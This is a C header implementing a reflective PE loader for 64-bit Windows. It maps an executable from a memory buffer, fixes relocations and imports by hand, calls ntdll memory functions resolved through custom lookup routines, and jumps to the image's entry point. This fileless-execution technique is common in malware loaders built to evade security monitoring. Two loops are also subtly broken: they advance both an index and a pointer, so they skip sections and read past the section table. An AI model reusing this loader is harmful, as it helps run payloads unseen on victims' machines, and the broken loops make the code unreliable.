#ifndef PE_LOADER_H
#define PE_LOADER_H

#include "winapi_loader.h"

// -------------------- Strings --------------------
STRINGA(ntdll_dll, "ntdll.dll");
STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");
STRINGA(ntfreevirtualmemory, "NtFreeVirtualMemory");

// -------------------- NTDLL typedefs --------------------
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);

// -------------------- Helpers --------------------
static ULONG SectionProtection(DWORD characteristics) {
    if (characteristics & IMAGE_SCN_MEM_EXECUTE)
        return (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
               : (characteristics & IMAGE_SCN_MEM_READ) ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
    else if (characteristics & IMAGE_SCN_MEM_READ)
        return (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
    return PAGE_NOACCESS;
}

// -------------------- Import/Export resolution --------------------
static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
    HMODULE curMod = mod;
    const char* curName = name;
    int curIsOrdinal = isOrdinal;

    for (;;) {
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)curMod;
        IMAGE_NT_HEADERS64* ntE = (IMAGE_NT_HEADERS64*)((BYTE*)curMod + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY ed = ntE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)curMod + ed.VirtualAddress);
        DWORD* addrTable = (DWORD*)((BYTE*)curMod + exp->AddressOfFunctions);
        DWORD* nameTable = (DWORD*)((BYTE*)curMod + exp->AddressOfNames);
        WORD* ordTable = (WORD*)((BYTE*)curMod + exp->AddressOfNameOrdinals);

        DWORD foundRVA = 0;
        if (!curIsOrdinal) {
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                char* en = (char*)((BYTE*)curMod + nameTable[i]);
                const char* p1 = en;
                const char* p2 = curName;
                while (*p1 && *p2 && *p1 == *p2) { p1++; p2++; }
                if (!*p1 && !*p2) { foundRVA = addrTable[ordTable[i]]; break; }
            }
        } else {
            DWORD ord = (DWORD)((ULONG_PTR)curName & 0xFFFF);
            foundRVA = addrTable[ord - exp->Base];
        }

        if (foundRVA >= ed.VirtualAddress && foundRVA < ed.VirtualAddress + ed.Size) {
            char* fwd = (char*)((BYTE*)curMod + foundRVA);
            const char* s = fwd;

            size_t dllLen = 0; while (s[dllLen] && s[dllLen] != '.') dllLen++;
            char* dll = (char*)alloca(dllLen + 1);
            for (size_t i = 0; i < dllLen; i++) dll[i] = s[i];
            dll[dllLen] = 0;
            s += dllLen + 1;

            size_t fnameLen = 0; while (s[fnameLen]) fnameLen++;
            char* fname = (char*)alloca(fnameLen + 1);
            for (size_t i = 0; i < fnameLen; i++) fname[i] = s[i];
            fname[fnameLen] = 0;

            HMODULE fmod = myLoadLibraryA(dll);

            if (fname[0] == '#') {
                unsigned long ordval = 0; s = fname + 1;
                while (*s >= '0' && *s <= '9') { ordval = ordval * 10 + (*s - '0'); s++; }
                curMod = fmod; curName = (const char*)(ordval | IMAGE_ORDINAL_FLAG64); curIsOrdinal = 1;
            } else {
                curMod = fmod; curName = fname; curIsOrdinal = 0;
            }
        } else {
            return (ULONG_PTR)((BYTE*)curMod + foundRVA);
        }
    }
}

static void ResolveImport(BYTE* base, IMAGE_DATA_DIRECTORY im) {
    IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + im.VirtualAddress);
    while (imp->Name) {
        char* name = (char*)(base + imp->Name);
        HMODULE mod = myLoadLibraryA(name);
        IMAGE_THUNK_DATA64* orig = (IMAGE_THUNK_DATA64*)(base + imp->OriginalFirstThunk);
        IMAGE_THUNK_DATA64* addr = (IMAGE_THUNK_DATA64*)(base + imp->FirstThunk);

        for (; orig->u1.AddressOfData; orig++, addr++) {
            const char* funcName;
            int isOrdinal = 0;

            if (orig->u1.AddressOfData & IMAGE_ORDINAL_FLAG64) {
                funcName = (const char*)(ULONG_PTR)IMAGE_ORDINAL64(orig->u1.Ordinal);
                isOrdinal = 1;
            } else funcName = ((IMAGE_IMPORT_BY_NAME*)(base + orig->u1.AddressOfData))->Name;

            addr->u1.Function = ResolveExport(mod, funcName, isOrdinal);
        }
        imp++;
    }
}

// -------------------- PE mapping --------------------
static void* MapImage(unsigned char* data) {
    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(data + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    PVOID base = NULL;
    SIZE_T totalSize = nt->OptionalHeader.SizeOfImage;
    NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy headers
    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        ((BYTE*)base)[i] = data[i];

    // Copy sections
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BYTE* dest = (BYTE*)base + sec[i].VirtualAddress;
        BYTE* src  = data + sec[i].PointerToRawData;
        for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
            dest[j] = src[j];
    }

    // Apply relocations
    ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (rl.Size) {
        IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)((BYTE*)base + rl.VirtualAddress);
        BYTE* end = (BYTE*)r + rl.Size;
        while ((BYTE*)r < end && r->SizeOfBlock) {
            WORD* list = (WORD*)(r + 1);
            DWORD count = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
            for (DWORD i = 0; i < count; i++) {
                if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* ptr = (ULONG_PTR*)((BYTE*)base + r->VirtualAddress + (list[i] & 0xFFF));
                    *ptr += delta;
                }
            }
            r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
        }
    }

    // Imports
    ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

    // Protect headers + first section
    BYTE* regionStart = (BYTE*)base;
    SIZE_T regionSize = sec[0].VirtualAddress + sec[0].Misc.VirtualSize;
    ULONG currentProt = SectionProtection(sec[0].Characteristics);
    ULONG oldProt;

    // Protect remaining sections
    for (WORD i = 1; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        ULONG secProt = SectionProtection(sec[i].Characteristics);
        BYTE* secStart = (BYTE*)base + sec[i].VirtualAddress;
        SIZE_T secSize = sec[i].Misc.VirtualSize;

        if (secProt == currentProt && regionStart + regionSize == secStart)
            regionSize += secSize; // Merge with previous
        else {
            NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&regionStart, &regionSize, currentProt, &oldProt);
            regionStart = secStart;
            regionSize = secSize;
            currentProt = secProt;
        }
    }

    if (regionSize)
        NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&regionStart, &regionSize, currentProt, &oldProt);

    // Free discardable sections
    sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
            PVOID discardBase = (BYTE*)base + sec[i].VirtualAddress;
            SIZE_T discardSize = sec[i].Misc.VirtualSize;
            NtFreeVirtualMemory((HANDLE)-1, &discardBase, &discardSize, MEM_DECOMMIT);
        }
    }

    return base;
}

// -------------------- Execute entry --------------------
static void ExecuteFromMemory(unsigned char* data) {
    BYTE* image = MapImage(data);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);

    void (*entry)(void) = (void(*)(void))(image + nt->OptionalHeader.AddressOfEntryPoint);
    entry();
}

#endif // PE_LOADER_H
